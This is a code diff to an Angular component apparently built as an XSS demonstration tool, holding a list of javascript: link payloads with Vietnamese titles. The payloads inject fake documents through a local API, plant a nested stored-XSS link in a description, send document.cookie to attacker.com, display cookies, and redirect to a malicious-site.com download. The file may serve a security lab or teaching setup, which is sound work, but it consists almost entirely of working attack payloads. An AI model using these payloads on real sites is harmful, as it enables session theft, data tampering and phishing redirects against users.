@@ -13,14 +13,29 @@ export class XssScriptsListComponent {
     public xssListService: XssListService,
   ){}
 
+  ngOnInit() {
+    this.xssListService.hide()
+  }
+
   readonly XssScriptlist = [
     {
       title: "Tạo tài liệu giả",
-      data: `<a href="javascript:fetch('http://localhost:3000/api/documents', { method: 'POST',headers: { 'Content-Type': 'application/json' },   body: JSON.stringify({     title: 'Tài liệu giả đươc chèn vào 7420',     description: '<b>Nội dung bị chèn</b>',     fileUrl: 'https://xss-test.com/fake'}) })">Tạo tài liệu Giả</a>`
+      data: `<a href="javascript:fetch('http://localhost:3000/api/documents', { method: 'POST',headers: { 'Content-Type': 'application/json' },   body: JSON.stringify({     title: 'Tài liệu giả đươc chèn vào ${Math.floor(Math.random()*1000)}',     description: '<b>Nội dung bị chèn</b>',     fileUrl: 'https://xss-test.com/fake'}) })">Tạo tài liệu Giả</a>`
     },
     {
-      title: "Truy vấn URL hiện tại",
-      data: `<a href="javascript:alert('Current URL: ' + window.location.href)">Xem URL Tài Liệu</a>`
+      title: "Tạo tài liệu giả href (link XSS trong description)",
+      data: `<a href="javascript:(function(){
+        const payload = {
+          title: 'Tài liệu XSS ' + Math.floor(Math.random() * 1000),
+          description: 'Link nguy hiểm: <a href=\\'javascript:alert()\\'>Click here</a>',
+          fileUrl: 'https://xss-test.com/fake'
+        };
+        fetch('http://localhost:3000/api/documents', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      })()">Tạo tài liệu với link XSS</a>`
     },
     {
       title: "Cập nhật tiêu đề tài liệu",
@@ -31,7 +46,7 @@ export class XssScriptsListComponent {
       })">Cập nhật tiêu đề tài liệu</a>`
     },
     {
-      title: "Tạo tài liệu giả",
+      title: "Gọi API tạo tài liệu giả mạo",
       data: `<a href="javascript:fetch('http://localhost:3000/api/documents', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -50,6 +65,10 @@ export class XssScriptsListComponent {
       title: "Đánh cắp cookie",
       data: `<a href="javascript:fetch('https://attacker.com/steal?cookie=' + document.cookie)">Gửi cookie đến attacker</a>`
     },
+    {
+      title: "Hiển thị cookie",
+      data: `<a href="javascript:alert('Cookie hiện tại: ' + document.cookie)">Xem cookie</a>`
+    },    
     {
       title: "Chuyển hướng đến tài liệu nguy hiểm",
       data: `<a href="javascript:window.location.href='https://malicious-site.com/fake-doc.pdf'">Tải tài liệu giả mạo</a>`
